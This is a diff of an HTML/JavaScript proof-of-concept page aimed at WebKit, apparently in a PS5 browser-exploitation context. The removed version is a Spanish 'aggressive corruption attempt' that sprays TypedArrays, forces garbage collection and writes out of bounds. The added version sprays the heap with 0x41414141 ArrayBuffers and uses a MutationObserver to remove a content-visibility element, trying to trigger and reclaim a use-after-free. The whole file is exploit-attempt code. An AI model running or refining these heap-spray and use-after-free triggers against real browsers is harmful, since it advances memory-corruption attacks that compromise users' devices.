@@ -1,68 +1,65 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-<meta charset="UTF-8" />
-<title>Intento agresivo de corrupción PS5 WebKit</title>
-<style>
-  body { background: black; color: white; font-family: monospace; }
-  #log { white-space: pre-wrap; max-height: 400px; overflow-y: scroll; border: 1px solid #333; padding: 10px; }
-</style>
+  <meta charset="utf-8">
+  <title>UAF Test - WebKit RenderLayer</title>
+  <style>
+    #victim {
+      width: 100px;
+      height: 100px;
+      background: red;
+      content-visibility: auto;
+      overflow: hidden;
+    }
+  </style>
 </head>
 <body>
-<h1>Intento agresivo de corrupción PS5 WebKit</h1>
-<div id="log"></div>
-<script>
-const log = document.getElementById('log');
-function debug(msg) {
-  log.textContent += msg + "\n";
-  log.scrollTop = log.scrollHeight;
-}
+  <div id="container"></div>
 
-debug("Iniciando estrés agresivo...\n");
-
-function sprayTypedArrays(count) {
-  debug(`Spray de ${count} TypedArrays...`);
-  let arrays = [];
-  for(let i=0; i<count; i++) {
-    let arr = new Uint8Array(1024);
-    for(let j=0; j<1024; j++) arr[j] = 0x41; // 'A'
-    arrays.push(arr);
-  }
-  debug("Spray completado.");
-  return arrays;
-}
-
-function triggerCorruption() {
-  debug("Intentando acceso fuera de límites para provocar corrupción...");
-
-  try {
-    let arr = new Uint8Array(10);
-    // Acceso fuera de límites intencional (no debería corromper en motores seguros)
-    for(let i=0; i<10000; i++) {
-      arr[i] = 0xFF;
+  <script>
+    function log(msg) {
+      const el = document.createElement("pre");
+      el.textContent = msg;
+      document.body.appendChild(el);
     }
-    debug("Acceso fuera de límites ejecutado.");
-  } catch(e) {
-    debug("Error detectado: " + e.message);
-  }
-}
 
-function forceGC() {
-  debug("Intentando forzar Garbage Collector...");
-  for(let i=0; i<10000; i++) {
-    new ArrayBuffer(1024*1024);
-  }
-  debug("GC forzado.");
-}
+    function sprayHeap() {
+      let spray = [];
+      for (let i = 0; i < 10000; i++) {
+        let ab = new ArrayBuffer(0x1000);
+        let dv = new DataView(ab);
+        dv.setUint32(0, 0x41414141, true);
+        spray.push(ab);
+      }
+      log("Heap sprayed");
+      return spray;
+    }
 
-function main() {
-  let spray = sprayTypedArrays(10000);
-  forceGC();
-  triggerCorruption();
-  debug("Fin del intento agresivo.");
-}
+    function triggerUAF() {
+      let div = document.createElement("div");
+      div.id = "victim";
+      document.getElementById("container").appendChild(div);
 
-setTimeout(main, 1000);
-</script>
+      let inner = document.createElement("div");
+      div.appendChild(inner);
+
+      let mo = new MutationObserver(() => {
+        document.getElementById("container").removeChild(div);
+        sprayHeap(); // Intentamos ocupar la memoria liberada
+        log("Possible UAF triggered");
+      });
+
+      mo.observe(div, { childList: true });
+
+      // Provoca el cambio de visibilidad y truncamiento
+      div.style.contentVisibility = "visible";
+      inner.textContent = "This is a test of the emergency broadcast system.";
+    }
+
+    window.onload = () => {
+      log("Starting UAF test...");
+      setTimeout(triggerUAF, 100);
+    };
+  </script>
 </body>
 </html>
